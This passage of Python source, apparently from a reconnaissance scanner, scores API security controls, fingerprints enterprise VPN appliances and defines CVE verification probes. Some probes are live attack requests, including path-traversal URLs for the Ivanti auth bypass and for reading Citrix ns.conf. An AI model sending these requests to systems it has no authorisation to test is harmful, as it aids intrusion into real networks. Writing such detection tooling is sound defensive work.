                    api_endpoints.append(r)
                    # Aggregate rate limit info
                    if r.get("rate_limits"):
                        rate_limit_info.update(r["rate_limits"])
                    # Aggregate auth info
                    if r.get("auth_required"):
                        auth_info[r["path"]] = {
                            "scheme": r.get("auth_scheme"),
                            "detail": r.get("auth_detail", ""),
                        }
                    # Aggregate gateway info
                    if r.get("gateway"):
                        gateway_info.update(r["gateway"])
                    # Aggregate schema validation + security vendor signals
                    if r.get("schema_validation"):
                        schema_info.extend(r["schema_validation"])
                    if r.get("positive_security"):
                        positive_security_signals.extend(r["positive_security"])
                    if r.get("security_vendor"):
                        security_vendor_info.update(r["security_vendor"])
                    if r.get("oidc_discovered"):
                        oidc_info["discovered"] = True
                        oidc_info["issuer"] = r.get("oidc_issuer", "")
            except Exception:
                pass
    # Also check main page headers for rate limit / gateway signals
    # Use session cookie if found during endpoint probing (cookie-based rate limiting)
    _session_cookie = None
    for ep_entry in api_endpoints:
        if isinstance(ep_entry, dict) and ep_entry.get("session_cookie"):
            _session_cookie = ep_entry["session_cookie"]
            break

    _main_headers = dict(extra_headers) if extra_headers else {}
    if _session_cookie:
        _main_headers["Cookie"] = _session_cookie

    try:
        status, body, hdrs = _fetch_url(f"{base}/", timeout=timeout, verify_ssl=True,
                                         headers=_main_headers or extra_headers)

        # ── Capture session cookies from main page for rate limit correlation ──
        set_cookie = hdrs.get("set-cookie", "")
        if set_cookie and not _session_cookie:
            cookie_parts = [c.split(";")[0].strip() for c in set_cookie.split(",")
                            if c.strip() and "=" in c.split(";")[0]]
            if cookie_parts:
                _session_cookie = "; ".join(cookie_parts)

        for rl_hdr in _API_RATE_LIMIT_HEADERS:
            val = hdrs.get(rl_hdr)
            if val and rl_hdr not in rate_limit_info:
                rate_limit_info[rl_hdr] = val
        for gw_hdr, gw_desc in _API_GATEWAY_HEADERS.items():
            val = hdrs.get(gw_hdr)
            if val and gw_hdr not in gateway_info:
                gateway_info[gw_hdr] = {"value": val[:80], "vendor": gw_desc}
        # ── Server header detection (Akamai, ESF/Apigee, nginx-plus, etc.) ──
        server_hdr = hdrs.get("server", "")
        if server_hdr:
            sv = server_hdr.lower()
            _SERVER_GW_MAP = {
                "akamaiGHost":      "Akamai API Gateway / EdgeGrid",
                "akamaighost":      "Akamai API Gateway / EdgeGrid",
                "AkamaiNetStorage": "Akamai NetStorage",
                "esf":              "Google Cloud Endpoints (ESF)",  # Apigee uses ESF
                "gunicorn":         "Python WSGI (possible API server)",
                "nginx-plus":       "Nginx Plus (F5 NGINX Plus)",
                "kong":             "Kong API Gateway",
            }
            for pattern, vendor in _SERVER_GW_MAP.items():
                if pattern.lower() in sv:
                    gateway_info[f"server:{pattern}"] = {
                        "value": server_hdr[:80], "vendor": vendor
                    }
        # ── Via header (Kong, Varnish, Squid, Nginx) ──────────────────────
        via_hdr = hdrs.get("via", "")
        if via_hdr:
            vl = via_hdr.lower()
            _VIA_GW_MAP = {
                "kong":             "Kong API Gateway",
                "kong-enterprise":  "Kong Enterprise API Gateway",
                "varnish":          "Varnish Cache (API layer)",
                "nginx":            "Nginx (API proxy)",
                "envoy":            "Envoy / Istio service mesh",
                "haproxy":          "HAProxy (API load balancer)",
                "traefik":          "Traefik ingress / API gateway",
                "cloudfront":       "AWS CloudFront",
                "akamai":           "Akamai CDN / API Gateway",
            }
            for pattern, vendor in _VIA_GW_MAP.items():
                if pattern in vl:
                    gateway_info[f"via:{pattern}"] = {
                        "value": via_hdr[:80], "vendor": vendor
                    }
        # ── Rate limit: Kong uses X-RateLimit-Limit-minute format ──────────
        for kong_rl in ("x-ratelimit-limit-minute", "x-ratelimit-remaining-minute",
                        "x-ratelimit-limit-hour", "x-ratelimit-limit-second"):
            val = hdrs.get(kong_rl)
            if val:
                rate_limit_info[kong_rl] = val
                # Kong-specific rate limits → also record as gateway signal
                if "kong" not in str(gateway_info):
                    gateway_info[f"ratelimit:{kong_rl}"] = {
                        "value": val[:80], "vendor": "Kong API Gateway (rate limiting)"
                    }
        # ── Akamai pragma debug headers ────────────────────────────────────
        pragma_hdr = hdrs.get("pragma", "")
        if pragma_hdr and "akamai" in pragma_hdr.lower():
            gateway_info["pragma:akamai"] = {
                "value": pragma_hdr[:80], "vendor": "Akamai CDN / API Gateway (debug)"
            }
        # ── x-cache with Akamai signature ─────────────────────────────────
        x_cache = hdrs.get("x-check-cacheable", hdrs.get("x-cache", ""))
        if x_cache and any(x in x_cache.upper() for x in ("TCP_", "MISS", "HIT")):
            if "akamai" not in str(gateway_info).lower():
                # Check x-true-cache-key or x-akamai headers
                for ak_hdr in ("x-true-cache-key", "x-akamai-session-info",
                                "x-akamai-request-id", "x-akamai-ssl-client-sid"):
                    if hdrs.get(ak_hdr):
                        gateway_info[ak_hdr] = {
                            "value": hdrs[ak_hdr][:80], "vendor": "Akamai CDN / API Gateway"
                        }
    except Exception:
        pass
    # Determine gateway vendor
    gw_vendors = set()
    for gw_hdr, info in gateway_info.items():
        if isinstance(info, dict):
            gw_vendors.add(info["vendor"])

    # ── Security posture scoring ───────────────────────────────────────────
    # Positive signals reduce the severity of the "API Vulnerability" finding.
    # A well-protected API (gateway + auth + rate limiting + schema) should be
    # reported as info/low, not high, even if endpoints are discovered.

    security_controls: List[str] = []
    if rate_limit_info:
        # Check if cookie-based rate limiting (Cloudflare __cf_bm, Akamai _abck, DataDome, etc.)
        if _session_cookie:
            security_controls.append(f"cookie-based rate limiting ({_session_cookie[:30]}...)")
        else:
            security_controls.append("rate limiting")
    if auth_info:
        security_controls.append(f"authentication ({len(auth_info)} endpoint(s))")
    if gw_vendors:
        security_controls.append(f"API gateway ({', '.join(sorted(gw_vendors)[:2])})")
    if schema_info:
        security_controls.append(f"schema validation ({', '.join(schema_info[:2])})")
    if security_vendor_info:
        vendor_names = [v.get("product", k) for k, v in list(security_vendor_info.items())[:2]]
        security_controls.append(f"API security vendor ({', '.join(vendor_names)})")
    if oidc_info.get("discovered"):
        security_controls.append(f"OIDC/OAuth2 ({oidc_info.get('issuer', 'discovered')})")
    if positive_security_signals:
        security_controls.append("security headers present")

    # Determine final severity:
    # critical → exposed spec with no auth + no gateway
    # high     → endpoints discovered, few/no security controls
    # medium   → endpoints with SOME controls (partial protection)
    # low      → endpoints with MOST controls (gateway + auth + rate limiting)
    # info     → endpoints with ALL key controls (full positive posture)
    n_controls = len(security_controls)
    if any(s.get("severity") == "critical" for s in specs_found):
        # Exposed spec is always at least medium even with controls
        severity = "critical" if n_controls == 0 else "high" if n_controls < 2 else "medium"
    elif specs_found and n_controls == 0:
        severity = "high"
    elif specs_found and n_controls >= 2:
        severity = "medium"
    elif api_endpoints and n_controls >= 3:
        # Well-protected API endpoints — positive posture
        severity = "low"
    elif api_endpoints and n_controls >= 1:
        severity = "medium"
    elif api_endpoints:
        severity = "high"
    else:
        severity = "info"

    # Build readable summary
    protection_summary = f"Security controls: {', '.join(security_controls)}" if security_controls \
        else "No security controls detected (no auth, no rate limiting, no gateway)"
    summary_parts = []
    if specs_found:
        summary_parts.append(f"{len(specs_found)} API spec/doc(s) exposed")
    summary_parts.append(f"{len(api_endpoints)} endpoint(s) found")
    summary_parts.append(protection_summary)
    if gw_vendors:
        summary_parts.append(f"Gateway: {', '.join(sorted(gw_vendors))}")

    return {
        "specs_found": specs_found,
        "api_endpoints": api_endpoints,
        "rate_limiting": {
            "detected": bool(rate_limit_info),
            "headers": rate_limit_info,
        },
        "authentication": {
            "detected": bool(auth_info),
            "endpoints": auth_info,
        },
        "api_gateway": {
            "detected": bool(gateway_info),
            "vendors": sorted(gw_vendors),
            "headers": {k: v for k, v in gateway_info.items()},
        },
        "schema_validation": {
            "detected": bool(schema_info),
            "signals": list(set(schema_info)),
        },
        "security_vendors": {
            "detected": bool(security_vendor_info),
            "products": security_vendor_info,
        },
        "oidc": oidc_info,
        "security_controls": security_controls,
        "security_posture": (
            "strong"   if n_controls >= 4 else
            "good"     if n_controls >= 3 else
            "partial"  if n_controls >= 1 else
            "none"
        ),
        "total_specs": len(specs_found),
        "total_endpoints_probed": len(seen_paths),
        "total_endpoints_found": len(api_endpoints),
        "severity": severity,
        "summary": ". ".join(summary_parts),
        "session_cookie": _session_cookie,       # Cookie for rate limit correlation
        "cookie_rate_limiting": bool(_session_cookie and rate_limit_info),
    }


# ---------------------------------------------------------------------------
# VPN / Remote Access Endpoint Detection
# ---------------------------------------------------------------------------
# Enterprise VPN concentrators are high-value targets:
#   - CVE-2023-46805 / CVE-2024-21887: Ivanti Connect Secure (Pulse) RCE chain
#   - CVE-2023-27997: FortiGate SSL-VPN heap overflow (pre-auth RCE)
#   - CVE-2024-3400: Palo Alto PAN-OS GlobalProtect command injection
#   - CVE-2023-20269: Cisco ASA/FTD brute-force + unauthorized VPN
#   - CVE-2023-3519: Citrix NetScaler ADC/Gateway RCE (zero-day)
#   - CVE-2024-23113: FortiOS format string vulnerability
# These are consistently in CISA KEV and used by ransomware groups.

_VPN_PRODUCTS = [
    # (path, body_pattern, product_id, product_label, severity_note)
    # ── Ivanti Connect Secure / Pulse Secure ──────────────────────────
    ("/dana-na/auth/url_default/welcome.cgi", re.compile(r'pulse|ivanti|connect\s*secure', re.I),
     "ivanti_pulse", "Ivanti Connect Secure (Pulse Secure)",
     "Critical: CVE-2023-46805 + CVE-2024-21887 auth bypass + RCE chain"),
    ("/dana/html5acc/guacamole/", re.compile(r'pulse|ivanti|guacamole', re.I),
     "ivanti_pulse", "Ivanti Connect Secure (Pulse Secure)", None),
    ("/dana-na/auth/url_0/welcome.cgi", None,
     "ivanti_pulse", "Ivanti Connect Secure (Pulse Secure)", None),
    # Ivanti Policy Secure
    ("/dana-na/auth/url_admin/welcome.cgi", None,
     "ivanti_policy", "Ivanti Policy Secure", None),
    # ── Fortinet FortiGate SSL-VPN ────────────────────────────────────
    ("/remote/login", re.compile(r'fortinet|fortigate|fortios|fgt_lang', re.I),
     "fortinet_sslvpn", "Fortinet FortiGate SSL-VPN",
     "Critical: CVE-2023-27997 heap overflow, CVE-2024-23113 format string"),
    ("/remote/logincheck", None,
     "fortinet_sslvpn", "Fortinet FortiGate SSL-VPN", None),
    ("/remote/fgt_lang", None,
     "fortinet_sslvpn", "Fortinet FortiGate SSL-VPN", None),
    # ── Palo Alto GlobalProtect ───────────────────────────────────────
    ("/global-protect/login.esp", re.compile(r'globalprotect|palo\s*alto|pan-os', re.I),
     "paloalto_gp", "Palo Alto GlobalProtect",
     "Critical: CVE-2024-3400 PAN-OS command injection (zero-day)"),
    ("/global-protect/portal/css/login.css", None,
     "paloalto_gp", "Palo Alto GlobalProtect", None),
    ("/ssl-vpn/login.esp", None,
     "paloalto_gp", "Palo Alto GlobalProtect", None),
    # ── Cisco AnyConnect / ASA / FTD ──────────────────────────────────
    ("/+CSCOE+/logon.html", re.compile(r'cisco|anyconnect|asa|webvpn', re.I),
     "cisco_anyconnect", "Cisco AnyConnect (ASA/FTD)",
     "High: CVE-2023-20269 brute-force + unauthorized VPN access"),
    ("/+CSCOT+/oem-customization", None,
     "cisco_anyconnect", "Cisco AnyConnect (ASA/FTD)", None),
    ("/CACHE/sdesktop/install/binaries/", None,
     "cisco_anyconnect", "Cisco AnyConnect (ASA/FTD)", None),
    # ── Citrix NetScaler / ADC Gateway ────────────────────────────────
    ("/vpn/index.html", re.compile(r'citrix|netscaler|nsg|gateway', re.I),
     "citrix_gateway", "Citrix NetScaler Gateway",
     "Critical: CVE-2023-3519 RCE (zero-day), CVE-2023-4966 info disclosure"),
    ("/logon/LogonPoint/tmindex.html", None,
     "citrix_gateway", "Citrix NetScaler Gateway", None),
    ("/vpn/tmindex.html", None,
     "citrix_gateway", "Citrix NetScaler Gateway", None),
    # ── SonicWall SMA / NetExtender ───────────────────────────────────
    ("/cgi-bin/welcome", re.compile(r'sonicwall|sma|netextender', re.I),
     "sonicwall", "SonicWall SSL-VPN",
     "High: CVE-2023-44221/CVE-2024-38475 SMA command injection"),
    ("/cgi-bin/main", re.compile(r'sonicwall', re.I),
     "sonicwall", "SonicWall SSL-VPN", None),
    # ── Check Point Mobile Access / SNX ───────────────────────────────
    ("/sslvpn/Login/Login", re.compile(r'check\s*point|mobile.*access|SNX', re.I),
     "checkpoint_vpn", "Check Point Mobile Access VPN",
     "High: CVE-2024-24919 info disclosure (zero-day)"),
    ("/sslvpn/xsl/sslvpn.xsl", None,
     "checkpoint_vpn", "Check Point Mobile Access VPN", None),
    # ── F5 BIG-IP APM ────────────────────────────────────────────────
    ("/my.policy", re.compile(r'f5|big-?ip|apm|access\s*policy', re.I),
     "f5_apm", "F5 BIG-IP APM VPN",
     "Critical: CVE-2023-46747 auth bypass, CVE-2022-1388 RCE"),
    ("/vdesk/", re.compile(r'f5|big-?ip', re.I),
     "f5_apm", "F5 BIG-IP APM VPN", None),
    # ── Juniper Secure Connect / SRX ──────────────────────────────────
    ("/dana/", re.compile(r'juniper|srx|secure\s*connect', re.I),
     "juniper_vpn", "Juniper Secure Connect VPN",
     "High: CVE-2023-36845 Junos PHP env injection"),
    # ── OpenVPN Access Server ─────────────────────────────────────────
    ("/__session_start__/", re.compile(r'openvpn', re.I),
     "openvpn_as", "OpenVPN Access Server", None),
    ("/admin/", re.compile(r'openvpn\s*access\s*server', re.I),
     "openvpn_as", "OpenVPN Access Server", None),
    # ── Barracuda CloudGen Access ─────────────────────────────────────
    ("/vpn/", re.compile(r'barracuda', re.I),
     "barracuda_vpn", "Barracuda VPN", None),
    # ── Array Networks AG/vxAG ────────────────────────────────────────
    ("/prx/000/http/localhost/login", re.compile(r'array\s*networks|arrayos', re.I),
     "array_vpn", "Array Networks SSL-VPN",
     "Critical: CVE-2023-28461 RCE (CISA KEV)"),
    # ── Sophos SSLVPN ────────────────────────────────────────────────
    ("/userportal/webpages/myaccount/login.jsp",
     re.compile(r'sophos|cyberoam', re.I),
     "sophos_vpn", "Sophos SSL-VPN", None),
]

# VPN-related response headers
_VPN_HEADERS = {
    "x-pulse-version": ("ivanti_pulse", "Ivanti Connect Secure (Pulse Secure)"),
    "x-fortigate": ("fortinet_sslvpn", "Fortinet FortiGate"),
    "server": None,  # special handling below
}

# VPN server header fingerprints
_VPN_SERVER_PATTERNS = [
    # F5 BIG-IP: require "BIG-IP" (with hyphen) or "BigIP" — NOT bare "F5"
    # "F5" alone is too common (base64 strings, JS variable names, CSS, etc.)
    # Confirmed false positive: biccamera.co.jp body contains "F5" in base64
    (re.compile(r'\bBigIP\b|BIG-IP|BIG\s*IP', re.I), "f5_apm", "F5 BIG-IP"),
    # Also accept "F5 BIG-IP" or "F5 Networks" as longer form
    (re.compile(r'F5\s+(?:BIG-IP|Networks|iControl|iRules|TMOS)', re.I), "f5_apm", "F5 BIG-IP"),
    (re.compile(r'SonicWALL', re.I), "sonicwall", "SonicWall"),
    (re.compile(r'Check\s*Point', re.I), "checkpoint_vpn", "Check Point"),
    (re.compile(r'NetScaler|Citrix\s+(?:Gateway|ADC|VPN)', re.I), "citrix_gateway", "Citrix NetScaler"),
    (re.compile(r'Juniper\s+(?:SRX|Networks|SSL\s*VPN|Secure\s*Connect)', re.I), "juniper_vpn", "Juniper"),
    (re.compile(r'Barracuda', re.I), "barracuda_vpn", "Barracuda"),
    (re.compile(r'Array\s+Networks', re.I), "array_vpn", "Array Networks"),
]

# Common VPN-related ports (for enrichment, not active scanning)
_VPN_PORTS = {
    443: "SSL-VPN (HTTPS)",
    8443: "SSL-VPN (alt)",
    10443: "Fortinet SSL-VPN",
    4443: "Pulse Secure",
    1194: "OpenVPN (UDP/TCP)",
    51820: "WireGuard",
    500: "IPsec IKE",
    4500: "IPsec NAT-T",
}


def check_vpn_endpoints(host: str, port: int, use_ssl: bool,
                        timeout: int = 5,
                        extra_headers: Optional[Dict[str, str]] = None,
                        body: str = "",
                        resp_headers: Optional[Dict[str, str]] = None,
                        ) -> Dict[str, Any]:
    """Detect VPN / remote access endpoints and identify the vendor/product.

    Probes known VPN login paths for major enterprise VPN products,
    fingerprints via response body, headers, and server strings.
    Each finding includes associated CVEs for the vendor.
    """
    from fray.recon.http import _fetch_url
    import concurrent.futures

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

    detected: Dict[str, Dict[str, Any]] = {}  # product_id -> info
    probed_paths: List[str] = []

    def _probe_vpn_path(path, body_pat, prod_id, prod_label, sev_note):
        """Probe a single VPN path."""
        url = f"{base}{path}"
        try:
            status, rbody, rhdrs = _fetch_url(url, timeout=timeout, verify_ssl=False,
                                               headers=extra_headers)
        except Exception:
            return None

        if status == 0 or status == 404:
            return None

        # Match: 200/301/302/401/403 all indicate the path exists
        matched = False
        match_signals = []

        if status == 200:
            if body_pat and rbody and body_pat.search(rbody):
                matched = True
                match_signals.append(f"body_match:{path}")
            elif not body_pat and len(rbody) > 50:
                # No body pattern — path exists with content
                matched = True
                match_signals.append(f"path_exists:{path}")
        elif status in (301, 302):
            # Redirects are NOT reliable for VPN detection.
            # Many CMSes redirect all unknown paths. Only trust redirects
            # if we also see VPN-specific headers in the response.
            pass
        elif status == 401:
            # 401 with WWW-Authenticate is a strong signal (actual auth challenge)
            if rhdrs.get('www-authenticate'):
                matched = True
                match_signals.append(f"auth_challenge:{path} ({rhdrs['www-authenticate'][:40]})")
        elif status == 403:
            # 403 alone is too weak (generic WAF/Apache), only trust with
            # VPN-specific headers present
            pass

        # Check headers for VPN vendor signals
        for hdr_key, hdr_info in _VPN_HEADERS.items():
            if hdr_key == "server":
                continue  # handled separately
            val = rhdrs.get(hdr_key)
            if val and hdr_info:
                matched = True
                match_signals.append(f"header:{hdr_key}={val[:40]}")

        # Server header fingerprint
        server = rhdrs.get("server", "")
        if server:
            for spat, sid, slabel in _VPN_SERVER_PATTERNS:
                if spat.search(server):
                    matched = True
                    match_signals.append(f"server:{server[:40]}")
                    break

        if matched:
            return {
                "product_id": prod_id, "label": prod_label,
                "path": path, "status": status,
                "signals": match_signals, "severity_note": sev_note,
            }
        return None

    # Probe all VPN paths concurrently
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        futures = {}
        seen_prods = set()
        for path, body_pat, prod_id, prod_label, sev_note in _VPN_PRODUCTS:
            f = pool.submit(_probe_vpn_path, path, body_pat, prod_id, prod_label, sev_note)
            futures[f] = (path, prod_id)
            probed_paths.append(path)

        for f in concurrent.futures.as_completed(futures, timeout=timeout * 6):
            try:
                r = f.result()
                if r:
                    pid = r["product_id"]
                    if pid not in detected:
                        detected[pid] = {
                            "product_id": pid,
                            "label": r["label"],
                            "paths": [],
                            "signals": [],
                            "severity_note": r.get("severity_note"),
                        }
                    detected[pid]["paths"].append(r["path"])
                    detected[pid]["signals"].extend(r["signals"])
            except Exception:
                pass

    # Also check main page body/headers for VPN indicators
    hdrs = resp_headers or {}
    if body:
        for _pat, _sid, _label in _VPN_SERVER_PATTERNS:
            if _pat.search(body):
                if _sid not in detected:
                    detected[_sid] = {
                        "product_id": _sid, "label": _label,
                        "paths": ["/"], "signals": ["body_main_page"],
                        "severity_note": None,
                    }
    # Check VPN-specific response headers (x-pulse-version, x-fortigate, etc.)
    for hdr_key, hdr_info in _VPN_HEADERS.items():
        if hdr_key == "server":
            continue
        val = hdrs.get(hdr_key)
        if val and hdr_info:
            _hdr_pid, _hdr_label = hdr_info
            if _hdr_pid not in detected:
                # Look up severity_note from _VPN_PRODUCTS
                _sev = None
                for _p in _VPN_PRODUCTS:
                    if _p[2] == _hdr_pid and _p[4]:
                        _sev = _p[4]
                        break
                detected[_hdr_pid] = {
                    "product_id": _hdr_pid, "label": _hdr_label,
                    "paths": ["/"], "signals": [f"header:{hdr_key}={val[:60]}"],
                    "severity_note": _sev,
                }
    # Check Server header for VPN product fingerprints
    server_hdr = hdrs.get("server", "")
    if server_hdr:
        for _pat, _sid, _label in _VPN_SERVER_PATTERNS:
            if _pat.search(server_hdr):
                if _sid not in detected:
                    detected[_sid] = {
                        "product_id": _sid, "label": _label,
                        "paths": ["/"], "signals": [f"server_header:{server_hdr[:60]}"],
                        "severity_note": None,
                    }

    # Filter out generic detections if a specific product was found
    specific = {k for k in detected if not k.startswith("generic_")}
    if specific:
        detected = {k: v for k, v in detected.items() if not k.startswith("generic_")}

    # ── Phase 2: CVE verification probes for detected vendors ─────────
    # Only run when a specific vendor is identified.  All probes are
    # safe / read-only: version extraction, path disclosure, info leak.
    # NO exploitation payloads, NO data mutation.
    cve_findings: List[Dict[str, Any]] = []

    if detected:
        from fray.recon.http import _fetch_url as _cve_fetch

        def _probe_cve(cve_id, path, method, body_pat, vuln_condition,
                       cvss, description, affected, remediation):
            """Probe a single CVE indicator path. Returns finding or None."""
            url = f"{base}{path}"
            try:
                st, bd, hd = _cve_fetch(url, timeout=timeout, verify_ssl=False,
                                         headers=extra_headers)
            except Exception:
                return None
            if st == 0:
                return None

            verified = False
            evidence = []

            if method == "status":
                # Vulnerable if specific status code returned
                if st == vuln_condition:
                    verified = True
                    evidence.append(f"status={st} on {path}")
            elif method == "body_match":
                # Vulnerable if body matches pattern
                if bd and body_pat and body_pat.search(bd):
                    verified = True
                    match = body_pat.search(bd).group(0)[:80]
                    evidence.append(f"body_match:{match}")
            elif method == "body_absent":
                # Vulnerable if body does NOT contain expected security string
                if st == 200 and bd and (not body_pat or not body_pat.search(bd)):
                    verified = True
                    evidence.append(f"missing_security_check on {path}")
            elif method == "version_check":
                # Extract version and compare
                if bd and body_pat:
                    m = body_pat.search(bd)
                    if m:
                        ver = m.group(1) if m.lastindex else m.group(0)
                        evidence.append(f"version={ver}")
                        # vuln_condition is a callable that checks version
                        if callable(vuln_condition) and vuln_condition(ver):
                            verified = True
                        else:
                            evidence.append("version_detected_but_not_vulnerable")
                elif hd and body_pat:
                    # Check headers too
                    for hv in hd.values():
                        m = body_pat.search(str(hv))
                        if m:
                            ver = m.group(1) if m.lastindex else m.group(0)
                            evidence.append(f"version_header={ver}")
                            if callable(vuln_condition) and vuln_condition(ver):
                                verified = True
                            break
            elif method == "header_check":
                # Vulnerable if specific header present
                hdr_name = vuln_condition
                val = hd.get(hdr_name, "")
                if val:
                    verified = True
                    evidence.append(f"header:{hdr_name}={val[:60]}")
            elif method == "info_leak":
                # Path returns sensitive data (200 + content)
                if st == 200 and bd and len(bd) > 20:
                    if body_pat and body_pat.search(bd):
                        verified = True
                        evidence.append(f"info_leak:{path} ({len(bd)} bytes)")
                    elif not body_pat:
                        verified = True
                        evidence.append(f"info_leak:{path} ({len(bd)} bytes)")

            if verified:
                return {
                    "cve_id": cve_id, "cvss": cvss,
                    "description": description,
                    "affected_versions": affected,
                    "remediation": remediation,
                    "verified": True,
                    "evidence": evidence,
                    "probe_path": path,
                    "probe_status": st,
                }
            elif evidence:
                return {
                    "cve_id": cve_id, "cvss": cvss,
                    "description": description,
                    "affected_versions": affected,
                    "remediation": remediation,
                    "verified": False,
                    "evidence": evidence,
                    "probe_path": path,
                    "probe_status": st,
                }
            return None

        # ── CVE probe definitions per vendor ──
        # (cve_id, product_id, path, method, body_pattern, vuln_condition,
        #  cvss, description, affected_versions, remediation)
        _CVE_PROBES = [
            # ── Ivanti Connect Secure / Pulse Secure ──
            ("CVE-2023-46805", "ivanti_pulse",
             "/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection",
             "status", None, 200, 9.8,
             "Auth bypass via path traversal — allows unauthenticated access to restricted API endpoints",
             "Ivanti Connect Secure <22.4R2.2, <9.1R18.3; Policy Secure <22.5R1.1",
             "Upgrade to Ivanti Connect Secure 22.4R2.3+ or 9.1R18.4+, apply vendor mitigation XML"),
            ("CVE-2024-21887", "ivanti_pulse",
             "/api/v1/license/key-status/;",
             "body_match", re.compile(r'license|key.?status|serial', re.I), None, 9.1,
             "Command injection in web component — chained with CVE-2023-46805 for pre-auth RCE",
             "Ivanti Connect Secure <22.4R2.2, <9.1R18.3",
             "Upgrade to Ivanti Connect Secure 22.4R2.3+ or 9.1R18.4+"),
            ("CVE-2024-21893", "ivanti_pulse",
             "/dana-ws/saml20/login.cgi",
             "status", None, 200, 8.2,
             "SSRF in SAML component — allows unauthenticated access to restricted resources",
             "Ivanti Connect Secure <22.5R2.2, <22.4R2.3; Policy Secure <22.5R1.2",
             "Upgrade and apply SAML mitigation"),
            ("CVE-2025-0282", "ivanti_pulse",
             "/dana-na/auth/url_default/welcome.cgi",
             "version_check", re.compile(r'version["\s:]+(\d+\.\d+[A-Z]*\d*)', re.I),
             lambda v: any(x in v for x in ["22.7R2.4", "22.7R2.3", "22.7R2.2", "22.7R2.1", "22.7R2"]), 9.0,
             "Stack-based buffer overflow — pre-auth RCE (actively exploited Jan 2025)",
             "Ivanti Connect Secure <22.7R2.5",
             "Upgrade to 22.7R2.5+ immediately; run Integrity Checker Tool"),

            # ── Fortinet FortiGate SSL-VPN ──
            ("CVE-2023-27997", "fortinet_sslvpn",
             "/remote/logincheck",
             "body_match", re.compile(r'FortiOS|fgt_lang|fortinet', re.I), None, 9.8,
             "Heap-based buffer overflow in SSL-VPN — pre-auth RCE",
             "FortiOS 6.0.x-7.2.x before patches; 7.2.5+, 7.0.12+, 6.4.13+ are fixed",
             "Upgrade FortiOS: 7.4.0+, 7.2.5+, 7.0.12+, 6.4.13+, or 6.2.15+"),
            ("CVE-2024-23113", "fortinet_sslvpn",
             "/remote/error",
             "body_match", re.compile(r'fgt_lang|FortiOS', re.I), None, 9.8,
             "Format string vulnerability in fgfmd — pre-auth RCE via crafted requests",
             "FortiOS 7.0.0-7.0.13, 7.2.0-7.2.6, 7.4.0-7.4.2",
             "Upgrade to FortiOS 7.4.3+, 7.2.7+, 7.0.14+"),
            ("CVE-2024-47575", "fortinet_sslvpn",
             "/remote/fgt_lang?lang=en",
             "body_match", re.compile(r'"version"\s*:\s*"([^"]+)"', re.I), None, 9.8,
             "Missing authentication in FortiManager fgfmd — RCE as root (FortiJump)",
             "FortiManager 7.0.x-7.4.x, FortiOS 7.0.x-7.4.x",
             "Upgrade FortiManager 7.4.5+; disable fgfm on untrusted interfaces"),
            ("CVE-2022-42475", "fortinet_sslvpn",
             "/remote/login",
             "body_match", re.compile(r'fgt_lang|FortiGate', re.I), None, 9.8,
             "Heap overflow in sslvpnd — pre-auth RCE (exploited in the wild)",
             "FortiOS 5.x-7.2.2",
             "Upgrade to FortiOS 7.2.3+, 7.0.9+, 6.4.11+"),

            # ── Palo Alto GlobalProtect ──
            ("CVE-2024-3400", "paloalto_gp",
             "/global-protect/login.esp",
             "body_match", re.compile(r'PAN-?OS|GlobalProtect|pan-os-version["\s:]+([0-9.]+)', re.I), None, 10.0,
             "OS command injection in GlobalProtect — pre-auth RCE as root (zero-day, actively exploited)",
             "PAN-OS 10.2, 11.0, 11.1 with GlobalProtect enabled",
             "Upgrade PAN-OS: 10.2.9-h1+, 11.0.4-h1+, 11.1.2-h3+; apply threat prevention signature"),
            ("CVE-2024-0012", "paloalto_gp",
             "/php/utils/debug.php",
             "info_leak", re.compile(r'php|debug|trace|stack', re.I), None, 9.8,
             "Auth bypass in PAN-OS management interface — admin access without credentials",
             "PAN-OS <10.2.12-h2, <11.1.5-h1, <11.2.4-h1",
             "Upgrade PAN-OS; restrict management interface access to trusted IPs"),

            # ── Cisco AnyConnect / ASA / FTD ──
            ("CVE-2023-20269", "cisco_anyconnect",
             "/+CSCOE+/logon.html",
             "body_match", re.compile(r'cisco|anyconnect|webvpn|asa', re.I), None, 5.0,
             "Unauthorized VPN access — brute-force attacks against VPN credentials allowed",
             "Cisco ASA 9.16+, FTD 6.6+",
             "Enable lockout policies; use MFA; upgrade to fixed ASA/FTD release"),
            ("CVE-2024-20359", "cisco_anyconnect",
             "/+CSCOE+/logon.html",
             "body_match", re.compile(r'cisco|asa|adaptive', re.I), None, 6.0,
             "Persistent local code execution — pre-loaded backdoor survives reboots (ArcaneDoor)",
             "Cisco ASA multiple versions",
             "Upgrade to fixed ASA release; re-image device from trusted source"),

            # ── Citrix NetScaler / ADC Gateway ──
            ("CVE-2023-3519", "citrix_gateway",
             "/vpn/../vpns/cfg/ns.conf",
             "info_leak", re.compile(r'ns\.conf|bind\s|add\s|set\s', re.I), None, 9.8,
             "RCE via memory corruption — unauthenticated remote code execution (zero-day)",
             "NetScaler ADC/Gateway 13.1 before 13.1-49.13, 13.0 before 13.0-91.13",
             "Upgrade to 13.1-49.15+, 13.0-91.13+, 12.1-65.25+ immediately"),
            ("CVE-2023-4966", "citrix_gateway",
             "/oauth/idp/.well-known/openid-configuration",
             "info_leak", re.compile(r'issuer|token_endpoint|authorization', re.I), None, 9.4,
             "Information disclosure — session token leak, mass session hijacking (Citrix Bleed)",
             "NetScaler ADC/Gateway 14.1 before 14.1-8.50, 13.1 before 13.1-49.15",
             "Upgrade immediately; rotate ALL session tokens; revoke active sessions"),

            # ── SonicWall SMA ──
            ("CVE-2023-44221", "sonicwall",
             "/cgi-bin/welcome",
             "body_match", re.compile(r'sonicwall|SMA|netextender', re.I), None, 7.2,
             "Post-auth command injection in SMA management interface",
             "SMA 100 Series (200/210/400/410/500v) before 10.2.1.10-62sv",
             "Upgrade SMA firmware to 10.2.1.10-62sv+"),
            ("CVE-2024-38475", "sonicwall",
             "/cgi-bin/main",
             "body_match", re.compile(r'sonicwall|SMA', re.I), None, 9.8,
             "Apache httpd substitution escape in SMA — pre-auth arbitrary file read",
             "SMA 100 Series before 10.2.1.14-75sv",
             "Upgrade SMA firmware to 10.2.1.14-75sv+"),

            # ── Check Point Mobile Access ──
            ("CVE-2024-24919", "checkpoint_vpn",
             "/clients/MyCRL",
             "info_leak", None, None, 8.6,
             "Arbitrary file read — unauthenticated path traversal exposes /etc/shadow and session data",
